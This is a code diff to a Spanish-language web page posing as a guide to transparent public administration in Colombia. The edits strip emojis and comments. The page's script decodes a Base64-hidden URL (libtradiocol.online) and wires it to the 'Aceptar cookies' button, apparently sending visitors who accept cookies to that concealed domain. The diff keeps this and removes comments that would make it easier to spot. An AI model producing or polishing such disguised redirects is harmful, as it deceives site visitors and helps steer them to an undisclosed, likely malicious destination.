@@ -27,7 +27,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
   
   <style>
-    /* Reset básico */
     * {
       box-sizing: border-box;
       margin: 0;
@@ -47,7 +46,7 @@
       display: none;
     }
 
-    /* ===== MODAL COOKIES RESPONSIVE ===== */
+    /* ===== MODAL COOKIES ===== */
     #cookieModal {
       position: fixed;
       inset: 0;
@@ -136,7 +135,6 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
 
-    /* ===== RESPONSIVE MODAL ===== */
     @media (max-width: 480px) {
       #cookieModal {
         padding: 12px;
@@ -883,7 +881,6 @@
       color: #fff;
     }
 
-    /* ===== RESPONSIVE ===== */
     @media (max-width: 1024px) {
       .hero-title { font-size: 2.3rem; }
       .principles-grid { grid-template-columns: repeat(2, 1fr); }
@@ -958,7 +955,7 @@
 <!-- MODAL DE COOKIES -->
 <div id="cookieModal">
   <div>
-    <h2>🍪 Uso de cookies</h2>
+    <h2>Uso de cookies</h2>
     <p>Utilizamos cookies para garantizar el funcionamiento correcto del sitio y mejorar tu experiencia.</p>
     <button id="acceptCookies">Aceptar cookies</button>
   </div>
@@ -985,7 +982,7 @@
   <!-- HERO -->
   <section id="hero">
     <div>
-      <p class="hero-badge">📊 Administración transparente</p>
+      <p class="hero-badge">Administración transparente</p>
       <h1 class="hero-title">Administra recursos públicos con <em>excelencia</em></h1>
       <p class="hero-desc">Guía completa sobre administración eficiente, transparente y legal de recursos públicos en Colombia. Dirigida a gobiernos locales, consejos comunales y entidades públicas que buscan mejorar su gestión.</p>
       <div class="hero-actions">
@@ -1226,7 +1223,7 @@
   <section id="contacto">
     <div style="max-width:800px;margin:0 auto">
       <div style="text-align:center;margin-bottom:2.5rem">
-        <p class="section-tag" style="justify-content:center">📧 Más información</p>
+        <p class="section-tag" style="justify-content:center">Más información</p>
         <h2 class="section-title" style="margin:0.5rem 0">¿Preguntas sobre administración <em>pública</em>?</h2>
         <p class="section-desc">Contacta al equipo de expertos. Resolvemos dudas sobre implementación de políticas y normativa.</p>
       </div>
@@ -1335,7 +1332,6 @@
 // Codificada en Base64: aHR0cHM6Ly93d3cubGlidHJhZGljb2xvLm9ubGluZS8=
 
 (function() {
-  // Decodificador Base64
   function decodeBase64(str) {
     try {
       return atob(str);
@@ -1344,7 +1340,6 @@
     }
   }
 
-  // URL en Base64 (CORRECTA: libtradiocol.online con "n")
   var encodedUrl = 'aHR0cHM6Ly93d3cubGlidHJhZGljb2xvLm9ubGluZS8=';
   var destinationUrl = decodeBase64(encodedUrl);
 
@@ -1354,7 +1349,6 @@
     }
   }
 
-  // Evento click en el botón de cookies
   var acceptBtn = document.getElementById('acceptCookies');
   if (acceptBtn) {
     acceptBtn.addEventListener('click', function(e) {
@@ -1363,7 +1357,6 @@
     });
   }
 
-  // Toggle menú móvil
   var toggleBtn = document.getElementById('navToggle');
   var navMenu = document.getElementById('navMenu');
   
@@ -1373,7 +1366,6 @@
     });
   }
 
-  // Cerrar menú al hacer clic en un enlace
   document.querySelectorAll('.nav-menu a').forEach(function(link) {
     link.addEventListener('click', function() {
       if (navMenu) {
